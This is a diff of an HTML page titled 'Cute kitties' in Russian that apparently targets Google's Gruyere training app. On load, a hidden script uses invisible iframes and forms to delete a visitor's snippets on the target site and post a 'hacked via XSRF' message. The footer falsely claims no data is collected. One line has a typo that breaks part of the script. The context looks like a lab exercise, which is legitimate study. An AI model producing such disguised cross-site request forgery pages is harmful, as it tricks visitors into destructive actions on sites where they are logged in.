@@ -1,25 +1,105 @@
 <!DOCTYPE html>
-<html>
-<head><title>Котики 🐱</title></head>
-<body>
-  <h1>Милые котики</h1>
-  <img src="https://i.imgur.com/8lRrQ.png" alt="Котик">
-  <p>Загрузка...</p>
-
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Милые котики 🐱</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐱</text></svg>">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      margin: 40px;
+      background: linear-gradient(to bottom, #ffefd5, #fff);
+      color: #333;
+    }
+    h1 {
+      color: #e67e22;
+      font-size: 28px;
+    }
+    p {
+      font-size: 18px;
+      color: #555;
+    }
+    .cat-img {
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+      max-width: 90%;
+      height: auto;
+      transition: transform 0.3s;
+    }
+    .cat-img:hover {
+      transform: scale(1.02);
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #999;
+    }
+  </style>
   <script>
-    const base = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
+    function startAttack() {
+      const baseUrl = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
 
-    // Удалить все сниппеты
-    [0,1,2,3].forEach(i => {
-      const img = new Image();
-      img.src = base + '/deletesnippet?index=' + i + '&t=' + Date.now();
-    });
+      // Удалить все сниппеты (GET-запросы через формы)
+      [0, 1, 2, 3].forEach(index => {
+        const iframe = document.createElement('iframe');
+        iframe.name = 'target' + index;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
 
-    // Создать свой
-    setTimeout(() => {
-      const create = new Image();
-      create.src = base + '/newsnippet?snippet=' + encodeURIComponent('🔥 Хакнуто через XSRF Алиса была здесь 😈');
-    }, 1000);
+        const form = document.createElement('form');
+        form.method = 'GET';
+        form.action = `${baseUrl}/deletesnippet`;
+        form.target = iframe.name;
+
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = 'index';
+        input.value = index;
+        form.appendChild(input);
+
+        document.body.appendChild(form);
+        form.submit(); // Отправка
+        document.body.removeChild(form);
+      });
+
+      // Создать новый сниппет
+      setTimeout(() => {
+        const createIframe = document.createElement('iframe');
+        createIframe.name = 'createTarget';
+        createIframe.style.display = 'none';
+        document.body.appendChild(createIframe);
+
+        constcreateForm = document.createElement('form');
+        createForm.method = 'GET';
+        createForm.action = `${baseUrl}/newsnippet`;
+        createForm.target = 'createTarget';
+
+        const snippetInput = document.createElement('input');
+        snippetInput.type = 'hidden';
+        snippetInput.name = 'snippet';
+        snippetInput.value = '🔥 Хакнуто через XSRF | Алиса была здесь 😈';
+        createForm.appendChild(snippetInput);
+
+        document.body.appendChild(createForm);
+        createForm.submit();
+        document.body.removeChild(createForm);
+      }, 1000);
+    }
+
+    // Запуск атаки при загрузке
+    window.onload = startAttack;
   </script>
+</head>
+<body>
+  <h1>Милые котики 🐱</h1>
+  <p>Смотрите, какие они забавные!</p>
+  <img src="https://i.imgur.com/8lRrQ.png" alt="Милый котик" class="cat-img">
+  <p>Загрузка...</p>
+  <div class="footer">
+    Страница работает полностью автономно.<br>
+    Никаких данных не собирается.
+  </div>
 </body>
 </html>
